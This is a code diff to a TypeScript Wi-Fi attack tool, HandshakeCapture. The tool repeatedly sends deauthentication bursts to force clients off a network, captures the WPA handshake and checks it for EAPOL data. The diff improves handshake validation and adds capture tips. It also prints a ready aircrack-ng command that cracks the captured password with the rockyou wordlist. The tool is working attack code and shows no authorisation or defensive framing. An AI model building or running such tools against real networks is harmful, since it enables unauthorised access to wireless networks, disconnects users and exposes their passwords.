@@ -159,7 +159,7 @@ export class HandshakeCapture {
   }
 
   /**
-   * Check if capture file contains a handshake
+   * Check if capture file contains a valid handshake with EAPOL data
    */
   private async checkForHandshake(capturePath: string): Promise<boolean> {
     console.log(`\n🔍 Checking for handshake in ${path.basename(capturePath)}...`);
@@ -178,18 +178,33 @@ export class HandshakeCapture {
       });
       
       check.on('close', () => {
-        // Look for handshake indicators in output
-        const hasHandshake = output.includes('1 handshake') || 
-                            output.includes('handshake') ||
-                            output.includes('WPA (1 handshake)');
+        // Check for error messages first
+        const noEAPOL = output.includes('no EAPOL') || 
+                       output.includes('Packets contained no EAPOL data') ||
+                       output.includes('unable to process this AP');
         
-        if (hasHandshake) {
-          console.log('✅ Handshake detected!');
-        } else {
-          console.log('❌ No handshake found yet');
+        if (noEAPOL) {
+          console.log('❌ No EAPOL data found - handshake not captured');
+          resolve(false);
+          return;
         }
         
-        resolve(hasHandshake);
+        // Look for valid handshake indicators
+        const hasHandshake = (output.includes('1 handshake') || 
+                             output.includes('handshake')) &&
+                             !output.includes('0 handshake');
+        
+        // Additional check for WPA format
+        const hasWPA = output.match(/WPA \(\d+ handshake/);
+        const hasValidWPA = hasWPA && !output.includes('WPA (0 handshake)');
+        
+        if (hasHandshake || hasValidWPA) {
+          console.log('✅ Valid handshake with EAPOL data detected!');
+          resolve(true);
+        } else {
+          console.log('❌ No valid handshake found yet');
+          resolve(false);
+        }
       });
     });
   }
@@ -256,25 +271,27 @@ export class HandshakeCapture {
       const startTime = Date.now();
       const endTime = startTime + (duration * 1000);
       let handshakeCaptured = false;
+      let attempts = 0;
       
       console.log(`\n⏱️  Capturing for ${duration} seconds...`);
       
       while (Date.now() < endTime && !handshakeCaptured) {
         const remaining = Math.ceil((endTime - Date.now()) / 1000);
-        process.stdout.write(`\r   Time remaining: ${remaining}s   `);
+        process.stdout.write(`\r   Time remaining: ${remaining}s | Attempts: ${attempts}   `);
         
         await new Promise(res => setTimeout(res, deauthInterval * 1000));
         
         // Send another deauth burst
         if (Date.now() < endTime) {
           await this.sendDeauth(options);
+          attempts++;
           
           // Check for handshake
           await new Promise(res => setTimeout(res, 2000));
           handshakeCaptured = await this.checkForHandshake(capturePath);
           
           if (handshakeCaptured) {
-            console.log('\n\n🎉 Handshake captured successfully!');
+            console.log('\n\n🎉 Valid handshake with EAPOL data captured successfully!');
             break;
           }
         }
@@ -283,8 +300,14 @@ export class HandshakeCapture {
       console.log('\n');
       
       if (!handshakeCaptured) {
-        console.log('⚠️  Capture completed, but handshake may not have been captured');
-        console.log('   You can verify manually with: aircrack-ng ' + capturePath);
+        console.log('⚠️  Capture timeout reached without valid handshake');
+        console.log('   Possible reasons:');
+        console.log('   - No clients are connected to this network');
+        console.log('   - Clients did not reconnect after deauth');
+        console.log('   - Signal strength too weak');
+        console.log('   - Wrong channel or BSSID');
+        console.log('\n   You can verify manually with: sudo aircrack-ng ' + capturePath);
+        console.log('   If it shows "no EAPOL data", the capture is not usable.');
       }
       
       return capturePath;
@@ -375,7 +398,24 @@ export async function captureHandshakeInteractive(): Promise<void> {
   
   const capturePath = await capture.captureHandshake(options);
   
-  console.log(`\n✅ Capture saved to: ${capturePath}`);
-  console.log(`\nTo crack the password, run:`);
-  console.log(`   sudo aircrack-ng -w ./password-lists/rockyou.txt ${capturePath}`);
+  // Perform final verification
+  console.log(`\n📁 Capture saved to: ${capturePath}`);
+  console.log(`\n🔍 Performing final verification...`);
+  
+  // Use a private method via the class instance
+  const isValid = await (capture as any).checkForHandshake(capturePath);
+  
+  if (isValid) {
+    console.log(`\n✅ SUCCESS! Valid handshake with EAPOL data confirmed!`);
+    console.log(`\n🔓 To crack the password, run:`);
+    console.log(`   sudo aircrack-ng -w ./password-lists/rockyou.txt ${capturePath}`);
+  } else {
+    console.log(`\n❌ WARNING: No valid handshake found in capture file!`);
+    console.log(`   The file does not contain usable EAPOL data.`);
+    console.log(`   Try capturing again with these tips:`);
+    console.log(`   - Ensure clients are actively connected to the network`);
+    console.log(`   - Try a longer capture duration (2-5 minutes)`);
+    console.log(`   - Move closer to the access point`);
+    console.log(`   - Verify you're on the correct channel`);
+  }
 }
